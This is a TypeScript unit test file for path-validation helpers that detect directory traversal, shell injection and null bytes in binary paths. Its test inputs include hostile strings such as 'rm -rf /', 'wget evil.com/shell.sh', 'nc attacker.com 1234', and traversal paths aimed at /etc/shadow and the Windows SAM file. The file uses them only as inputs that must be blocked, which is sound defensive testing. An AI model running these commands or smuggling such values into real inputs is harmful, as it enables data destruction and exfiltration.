/**
 * Unit tests for TypeScript path validation utilities.
 * Run with: node --test dist/lib/pathValidation.test.js
 * 
 * These tests mirror the JavaScript tests in bin/lib/pathValidation.test.js
 * to ensure the TypeScript port maintains the same behavior.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert';
import {
  containsTraversal,
  containsShellInjection,
  checkExecutable,
  validateBinaryPath,
  validateBeadsPath,
  validateBacklogPath,
  type ValidationResult,
  type ExecutableCheckResult,
} from './pathValidation.js';

describe('containsTraversal (TypeScript)', () => {
  it('should detect ../ traversal', () => {
    assert.strictEqual(containsTraversal('../file'), true);
    assert.strictEqual(containsTraversal('path/../file'), true);
    assert.strictEqual(containsTraversal('/path/../file'), true);
    assert.strictEqual(containsTraversal('path/..'), true);
  });

  it('should detect ..\\ traversal (Windows)', () => {
    assert.strictEqual(containsTraversal('..\\file'), true);
    assert.strictEqual(containsTraversal('path\\..\\file'), true);
    assert.strictEqual(containsTraversal('C:\\path\\..\\file'), true);
  });

  it('should detect standalone ..', () => {
    assert.strictEqual(containsTraversal('..'), true);
  });

  it('should allow normal paths', () => {
    assert.strictEqual(containsTraversal('/usr/local/bin/bd'), false);
    assert.strictEqual(containsTraversal('/home/user/.local/bin/bd'), false);
    assert.strictEqual(containsTraversal('C:\\Users\\name\\bin\\bd.exe'), false);
  });

  it('should allow paths with dots in filenames', () => {
    assert.strictEqual(containsTraversal('/path/to/file.test.js'), false);
    assert.strictEqual(containsTraversal('/path/.hidden/file'), false);
  });
});

describe('containsShellInjection (TypeScript)', () => {
  it('should detect command chaining characters', () => {
    assert.strictEqual(containsShellInjection('/bin/bd; rm -rf /'), true);
    assert.strictEqual(containsShellInjection('/bin/bd && evil'), true);
    assert.strictEqual(containsShellInjection('/bin/bd || evil'), true);
    assert.strictEqual(containsShellInjection('/bin/bd | grep'), true);
  });

  it('should detect backticks and subshells', () => {
    assert.strictEqual(containsShellInjection('/bin/`whoami`'), true);
    assert.strictEqual(containsShellInjection('/bin/$(whoami)'), true);
    assert.strictEqual(containsShellInjection('/bin/${evil}'), true);
  });

  it('should detect quotes', () => {
    assert.strictEqual(containsShellInjection('/bin/bd"evil"'), true);
    assert.strictEqual(containsShellInjection("/bin/bd'evil'"), true);
  });

  it('should detect redirections', () => {
    assert.strictEqual(containsShellInjection('/bin/bd > /etc/passwd'), true);
    assert.strictEqual(containsShellInjection('/bin/bd < /etc/passwd'), true);
  });

  it('should allow normal paths', () => {
    assert.strictEqual(containsShellInjection('/usr/local/bin/bd'), false);
    assert.strictEqual(containsShellInjection('/home/user/.local/bin/bd'), false);
    assert.strictEqual(containsShellInjection('C:\\Users\\name\\bin\\bd.exe'), false);
  });
});

describe('validateBinaryPath (TypeScript)', () => {
  describe('basic validation', () => {
    it('should reject empty paths', () => {
      const result1 = validateBinaryPath('');
      assert.strictEqual(result1.valid, false);
      assert.ok(result1.error?.includes('empty'));

      const result2 = validateBinaryPath('   ');
      assert.strictEqual(result2.valid, false);
    });

    it('should reject paths with traversal', () => {
      const result = validateBinaryPath('../../../etc/passwd');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error?.includes('traversal'));
    });

    it('should reject paths with shell injection', () => {
      const result = validateBinaryPath('/bin/bd; rm -rf /');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error?.includes('dangerous'));
    });

    it('should reject paths with null bytes', () => {
      const result = validateBinaryPath('/bin/bd\0evil');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error?.includes('null'));
    });

    it('should reject excessively long paths', () => {
      const longPath = '/bin/' + 'a'.repeat(5000);
      const result = validateBinaryPath(longPath);
      assert.strictEqual(result.valid, false);
      assert.ok(result.error?.includes('length'));
    });
  });

  describe('allowedBasenames validation', () => {
    it('should reject paths with non-allowed basenames', () => {
      const result = validateBinaryPath('/usr/bin/evil', {
        allowedBasenames: ['bd', 'backlog'],
        checkExists: false,
      });
      assert.strictEqual(result.valid, false);
      assert.ok(result.error?.includes('allowed list'));
    });

    it('should accept paths with allowed basenames', () => {
      const result = validateBinaryPath('/usr/bin/bd', {
        allowedBasenames: ['bd', 'backlog'],
        checkExists: false,
      });
      assert.strictEqual(result.valid, true);
    });
  });
});

describe('validateBeadsPath (TypeScript)', () => {
  it('should reject non-bd binaries', () => {
    const result = validateBeadsPath('/usr/bin/evil');
    assert.strictEqual(result.valid, false);
    assert.ok(result.error?.includes('allowed list') || result.error?.includes('not found'));
  });

  it('should reject paths with traversal even for bd', () => {
    const result = validateBeadsPath('../../../usr/bin/bd');
    assert.strictEqual(result.valid, false);
    assert.ok(result.error?.includes('traversal'));
  });
});

describe('validateBacklogPath (TypeScript)', () => {
  it('should reject non-backlog binaries', () => {
    const result = validateBacklogPath('/usr/bin/evil');
    assert.strictEqual(result.valid, false);
    assert.ok(result.error?.includes('allowed list') || result.error?.includes('not found'));
  });

  it('should reject paths with shell injection', () => {
    const result = validateBacklogPath('/bin/backlog; rm -rf /');
    assert.strictEqual(result.valid, false);
    assert.ok(result.error?.includes('dangerous'));
  });
});

describe('checkExecutable (TypeScript)', () => {
  it('should return exists=false for non-existent files', () => {
    const result = checkExecutable('/nonexistent/path/to/binary');
    assert.strictEqual(result.exists, false);
    assert.strictEqual(result.executable, false);
  });

  it('should detect executable files', () => {
    // Use a known executable on Unix systems
    if (process.platform !== 'win32') {
      const result = checkExecutable('/bin/sh');
      assert.strictEqual(result.exists, true);
      assert.strictEqual(result.executable, true);
    }
  });
});

describe('Type exports', () => {
  it('should export ValidationResult type correctly', () => {
    const valid: ValidationResult = { valid: true, normalizedPath: '/bin/bd' };
    const invalid: ValidationResult = { valid: false, error: 'Test error' };
    
    assert.strictEqual(valid.valid, true);
    assert.strictEqual(valid.normalizedPath, '/bin/bd');
    assert.strictEqual(invalid.valid, false);
    assert.strictEqual(invalid.error, 'Test error');
  });

  it('should export ExecutableCheckResult type correctly', () => {
    const result: ExecutableCheckResult = { exists: true, executable: true };
    
    assert.strictEqual(result.exists, true);
    assert.strictEqual(result.executable, true);
  });
});

describe('Attack scenario prevention (TypeScript)', () => {
  it('should prevent path traversal to system files', () => {
    const attacks = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/usr/bin/../../../etc/shadow',
    ];
    
    for (const attack of attacks) {
      const result = validateBinaryPath(attack);
      assert.strictEqual(result.valid, false, `Should block: ${attack}`);
    }
  });

  it('should prevent command injection via path', () => {
    const attacks = [
      '/bin/bd; cat /etc/passwd',
      '/bin/bd && wget evil.com/shell.sh',
      '/bin/bd | nc attacker.com 1234',
      '/bin/$(whoami)',
      '/bin/`id`',
    ];
    
    for (const attack of attacks) {
      const result = validateBinaryPath(attack);
      assert.strictEqual(result.valid, false, `Should block: ${attack}`);
    }
  });

  it('should prevent null byte injection', () => {
    const result = validateBinaryPath('/bin/bd\0.txt');
    assert.strictEqual(result.valid, false);
  });
});
